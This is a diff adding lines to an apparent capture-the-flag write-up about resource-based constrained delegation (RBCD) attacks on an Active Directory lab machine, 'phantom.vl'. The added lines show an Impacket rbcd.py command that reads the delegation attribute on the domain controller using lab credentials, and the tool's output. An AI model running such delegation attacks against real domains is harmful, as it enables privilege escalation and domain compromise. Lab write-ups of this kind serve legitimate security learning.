@@ -664,6 +664,11 @@ https://medium.com/@offsecdeer/a-practical-guide-to-rbcd-exploitation-a3f1a47267
 After checking the machine account quota, it is set to 0, so i cannot add a machine account and nor do i have access to one. To work around this ill have to use the SPN-less method
 
 ```python
+rbcd.py -delegate-to "dc$" -dc-ip 10.129.46.60 -action 'read' phantom.vl/wsilva:'Password123!'
+Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
+
 
 ```
 
